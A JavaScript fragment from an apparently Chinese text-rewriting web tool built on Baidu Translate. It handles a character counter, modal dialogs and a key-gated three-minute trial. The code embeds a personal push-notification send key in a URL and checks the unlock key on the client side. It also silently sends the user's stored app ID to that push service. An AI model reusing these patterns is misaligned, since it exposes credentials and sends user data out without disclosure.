	} else if (sendType == 7) {
		// 白嫖失败
		title = "【白嫖失败】：" + sendTitle;
		content = "【内容】：" + sendContent;
	} else {
		// 暂无
		title = '【暂无】：' + sendTitle;
		content = '【内容】：' + sendContent;
	}
	var config = {
		'title': title,
		'content': content,
	}

	setTimeout(() => {
		$.ajax({
			url: 'https://xizhi.qqoq.net/XZ4b8ade1ed1876ee54143d8a382a0ca7a.send',
			type: 'get',
			// async: true,
			// 跨域
			dataType: 'jsonp',
			contentType: 'application/x-www-form-urlencoded; charset=utf-8',
			data: {
				title: config.title,
				content: config.content,
			}
		})
	}, 1500);
}

$(".originData").on("input", function () {
	tongji($(this).val(), "o");
});

function tongji(Words, type) {
	// 标点和中文
	var sTotal = 0;
	// 中文字判断
	var iTotal = 0;
	// 英文字母
	var eTotal = 0;
	// 数字判断
	var inum = 0;
	for (i = 0; i < Words.length; i++) {
		var c = Words.charAt(i);
		//基本汉字
		if (c.match(/[\u4e00-\u9fa5]/)) {
			iTotal++;
		}
		//基本汉字补充
		else if (c.match(/[\u9FA6-\u9fcb]/)) {
			iTotal++;
		}
		if (c.match(/[^\x00-\xff]/)) {
			sTotal++;
		} else {
			eTotal++;
		}
		if (c.match(/[0-9]/)) {
			inum++;
		}
	}
	switch (type) {
		case "o":
			$("#zifu").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r":
			$("#zifu" + "1").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r1":
			$("#zifu" + "2").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r2":
			$("#zifu" + "3").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r3":
			$("#zifu" + "4").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r4":
			$("#zifu" + "5").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r5":
			$("#zifu" + "6").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
		case "r6":
			$("#zifu" + "7").text(iTotal * 2 + (sTotal - iTotal) * 2 + eTotal);
			break;
	}
}

$('#exampleModal').on('hidden.bs.modal', function (event) {
	$('body').css("padding-right", "");
})

var loginBtn = $('#loginBtn');
loginBtn.click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		showToast('请在弹出的窗口配置账号”', 1500);
		$('#exampleModal').modal('show')
		timer = null;
	}, 500);
});

$('.close').click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$('#exampleModal').modal('hide')
		$('#exampleModal1').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
		$('body').css("padding-right", "");
		timer = null;
	}, 500);
});

var sckey1 = "";

var relaxBtn = $('#relaxBtn');
relaxBtn.click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		showToast("请先关注微信公众号【FreySu】回复“密钥”", 5000);
		$('#exampleModal1').modal('show');
		timer = null;
	}, 500);
});

var okBtn = $("#okBtn");
okBtn.click(() => {
	var rscode = $("#rscode").val();
	var cursTimes = localStorage.getItem("sTimes");
	sckey1 = aMewlv1;
	if (rscode == sckey1) {
		sendRequest(localStorage.getItem("appid1"), "白嫖成功了！", 6);
		localStorage.setItem("appid1", WtdKltf2);
		localStorage.setItem("key1", zDQA3);
		if (!cursTimes) {
			localStorage.setItem("sTimes", 180000);
			showToast("3 分钟体验开始~", 4000);
			countTime();
		} else if (cursTimes > 0) {
			showToast(`你还剩余${cursTimes/1000}秒，现在继续体验！`, 4000);
			countTime();
		} else if (cursTimes == 0) {
			showToast(`<b>你还剩余${cursTimes/1000}秒~ 你的体验时长已结束！</b>如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~`, 4000);
		}

		function countTime() {
			var sTimes = localStorage.getItem("sTimes");
			var timer1 = setInterval(() => {
				sTimes -= 1000;
				localStorage.setItem("sTimes", sTimes);
				if (sTimes == 0) {
					clearInterval(timer1);
					localStorage.removeItem("appid1");
					localStorage.removeItem("key1");
					localStorage.setItem("sTimes", sTimes);
					showToast("你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~", 4500);
				}
			}, 1000);
			$('#exampleModal1').modal('hide')
			$('.modal-backdrop').css("z-index", "-10");
			$('body').css("padding-right", "");
			showToast("请在输入框填写要翻译的内容，然后点击【翻译并对比】按钮", 4500);
		}
	} else if (rscode == "") {
		showToast("未输入，提交失败！", 4000);
	} else {
		showToast("密钥不正确，请重新获取", 3000);
		sendRequest(localStorage.getItem("appid1"), "白嫖失败！", 7);
	}

});

var cancelBtn = $("#btn_cancel");
cancelBtn.click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$('#exampleModal1').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
		$('body').css("padding-right", "");
		timer = null;
	}, 500);
});

function countTime1() {
	var sTimes = localStorage.getItem("sTimes");
	var timer1 = setInterval(() => {
		sTimes -= 1000;
		localStorage.setItem("sTimes", sTimes);
		if (sTimes == 0) {
			clearInterval(timer1);
			localStorage.removeItem("appid1");
			localStorage.removeItem("key1");
			localStorage.setItem("sTimes", sTimes);
			showToast("你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~", 4500);
		}
	}, 1000);
}